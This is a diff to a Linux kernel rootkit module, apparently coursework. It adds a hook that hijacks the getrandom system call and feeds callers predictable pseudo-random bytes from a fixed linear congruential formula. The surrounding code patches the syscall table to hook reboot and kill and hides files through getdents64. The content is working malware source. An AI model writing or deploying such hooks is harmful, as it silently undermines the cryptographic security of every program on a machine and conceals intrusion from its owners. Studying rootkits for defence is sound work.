@@ -21,6 +21,8 @@ MODULE_DESCRIPTION("R12922072");
 MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
 
+#define HOOKLEN 4
+
 static int major;
 struct cdev *kernel_cdev;
 static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
@@ -32,6 +34,7 @@ static void (*update_mapping_prot_ptr)(phys_addr_t, unsigned long,
 static syscall_fn_t sys_reboot_orig;
 static syscall_fn_t sys_kill_orig;
 static syscall_fn_t sys_getdents64_orig;
+static syscall_fn_t sys_getrandom_orig;
 static struct hided_file hided_file;
 static filldir_t filldir64_ptr;
 
@@ -81,20 +84,43 @@ long kill_hook(const struct pt_regs *regs)
 		return sys_kill_orig(regs);
 }
 
+long getrandom_hook(const struct pt_regs *regs)
+{
+	char __user *buf = (char *)regs->regs[0];
+	size_t count = regs->regs[1];
+	int i;
+	unsigned long rand_num = get_random_u64();
+
+	for (i = 0; i < count; i++) {
+		if (copy_to_user(buf, &rand_num, 1))
+			return -EFAULT;
+		rand_num *= 6364136223846793005;
+		rand_num += 1442695040888963407;
+	}
+	return count;
+}
+
+#define SYSCALL_HOOK_NUM 3
 static int hook_syscall(unsigned long arg)
 {
 	int ret = 0;
-	int syscall_nr_arr[2] = { __NR_reboot, __NR_kill };
-	syscall_fn_t hook_arr[2];
+	int syscall_nr_arr[SYSCALL_HOOK_NUM] = {
+		__NR_reboot,
+		__NR_kill,
+		__NR_getrandom,
+	};
+	syscall_fn_t hook_arr[SYSCALL_HOOK_NUM];
 
 	if (sys_call_table_ptr[__NR_reboot] == sys_reboot_orig) {
 		hook_arr[0] = reboot_hook;
 		hook_arr[1] = kill_hook;
+		hook_arr[2] = getrandom_hook;
 	} else {
 		hook_arr[0] = sys_reboot_orig;
 		hook_arr[1] = sys_kill_orig;
+		hook_arr[2] = sys_getrandom_orig;
 	}
-	modify_syscall_table(hook_arr, syscall_nr_arr, 2);
+	modify_syscall_table(hook_arr, syscall_nr_arr, SYSCALL_HOOK_NUM);
 
 	return ret;
 }
@@ -280,18 +306,25 @@ static int __init rootkit_init(void)
 	sys_kill_orig = sys_call_table_ptr[__NR_kill];
 	sys_reboot_orig = sys_call_table_ptr[__NR_reboot];
 	sys_getdents64_orig = sys_call_table_ptr[__NR_getdents64];
+	sys_getrandom_orig = sys_call_table_ptr[__NR_getrandom];
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	int syscall_nr_arr[3] = { __NR_reboot, __NR_kill, __NR_getdents64 };
-	syscall_fn_t hook_arr[3] = {
+	int syscall_nr_arr[HOOKLEN] = {
+		__NR_reboot,
+		__NR_kill,
+		__NR_getdents64,
+		__NR_getrandom,
+	};
+	syscall_fn_t hook_arr[HOOKLEN] = {
 		sys_reboot_orig,
 		sys_kill_orig,
-		sys_getdents64_orig
+		sys_getdents64_orig,
+		sys_getrandom_orig,
 	};
-	modify_syscall_table(hook_arr,syscall_nr_arr, 3);
+	modify_syscall_table(hook_arr,syscall_nr_arr, HOOKLEN);
 	cdev_del(kernel_cdev);
 	unregister_chrdev_region(major, 1);
 }
